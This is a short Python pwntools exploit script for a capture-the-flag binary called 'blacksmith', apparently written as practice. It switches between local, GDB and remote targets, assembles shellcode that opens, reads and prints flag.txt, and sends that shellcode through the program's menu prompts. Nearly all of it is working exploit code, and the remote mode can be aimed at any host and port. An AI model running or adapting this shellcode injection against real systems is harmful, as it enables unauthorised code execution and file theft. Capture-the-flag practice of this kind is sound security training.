from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
continue
'''.format(**locals())


# Set up pwntools for the correct architecture
exe = './blacksmith'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# Shellcode to open flag.txt, read from it and then write to stdout
shellcode = asm(shellcraft.open('flag.txt'))
shellcode += asm(shellcraft.read(3, 'rsp', 0x100))
shellcode += asm(shellcraft.write(1, 'rsp', 'rax'))

# Send payload
io.sendlineafter('>', '1')  # Yes, I brought them
io.sendlineafter('>', '2')  # Craft a shield
io.sendlineafter('>', flat(shellcode))  # Pwn
io.recv()

# Get our flag!
flag = io.recv()
success(flag)
